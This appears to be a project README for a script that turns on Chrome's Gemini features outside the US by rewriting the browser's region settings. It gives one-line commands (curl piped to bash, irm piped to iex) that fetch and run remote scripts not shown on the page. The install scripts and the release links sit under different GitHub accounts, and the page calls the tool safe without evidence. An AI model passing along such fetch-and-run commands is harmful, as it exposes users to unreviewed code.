---
layout: "default"
title: "🌟 Gemini-in-Chrome - Unlock AI Features with Ease"
description: "🚀 Enable Chrome's Gemini AI features for non-US users with a simple one-click script, enhancing your browsing experience effortlessly."
---
# 🌟 Gemini-in-Chrome - Unlock AI Features with Ease

[![Download Gemini-in-Chrome](https://img.shields.io/badge/Download-Gemini--in--Chrome-brightgreen)](https://github.com/tianlanyb/Gemini-in-Chrome/releases)

## 🚀 Getting Started

Gemini-in-Chrome is a simple tool to enable Chrome’s built-in Gemini AI features for users outside the US. Follow the steps below to download and run the application easily.

### 📥 Download & Install

1. **Visit the Releases Page**  
   Go to [this link](https://github.com/tianlanyb/Gemini-in-Chrome/releases) to access the download options for Gemini-in-Chrome.

2. **Choose Your Operating System**  
   Select your system type below and follow the instructions.

### 🖥️ macOS / Linux

1. Open your terminal.
2. Copy and paste the command below to download and run the script.

   ```bash
   curl -fsSL https://raw.githubusercontent.com/appsail/Gemini-in-Chrome/main/install.sh | bash
   ```

### 🪟 Windows

1. Open PowerShell.
2. Copy and paste the command below to download and run the script.

   ```powershell
   irm https://raw.githubusercontent.com/appsail/Gemini-in-Chrome/main/install.ps1 | iex
   ```

## 🌈 What It Does

Once installed, Gemini-in-Chrome performs the following tasks:

1. ✅ Checks if Chrome is running and prompts you to close it.
2. 💾 Creates a backup of your config file named `Local State.bak`.
3. 🔧 Modifies the necessary settings:
   - Changes `is_glic_eligible` from `false` to `true`
   - Updates `variations_country` to `us`
   - Updates `variations_permanent_consistency_country` to `us`
4. ✓ Confirms that the changes were applied successfully.

## 🔙 Restore Original Config

If you want to revert your changes, you can restore your original config file by following the steps below for your operating system.

**macOS:**

1. Open your terminal.
2. Run this command:

   ```bash
   mv ~/Library/Application\ Support/Google/Chrome/Local\ State.bak \
      ~/Library/Application\ Support/Google/Chrome/Local\ State
   ```

**Linux:**

1. Open your terminal.
2. Run this command:

   ```bash
   mv ~/.config/google-chrome/Local\ State.bak \
      ~/.config/google-chrome/Local\ State
   ```

**Windows PowerShell:**

1. Open PowerShell.
2. Run this command:

   ```powershell
   Move-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State.bak" -Destination "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
   ```

## ❓ Frequently Asked Questions

### What are system requirements for Gemini-in-Chrome?

- Chrome version 100 or higher
- A compatible operating system: macOS, Linux, or Windows

### Is it safe to use?

Yes, Gemini-in-Chrome only modifies configuration files used by your browser and creates a backup for easy restoration.

### How can I provide feedback or report bugs?

You can report issues or suggestions in the issues section of the [GitHub repository](https://github.com/tianlanyb/Gemini-in-Chrome/issues).

---

For further information or assistance, please refer to the documentation on the [GitHub repository](https://github.com/tianlanyb/Gemini-in-Chrome). Thank you for using Gemini-in-Chrome!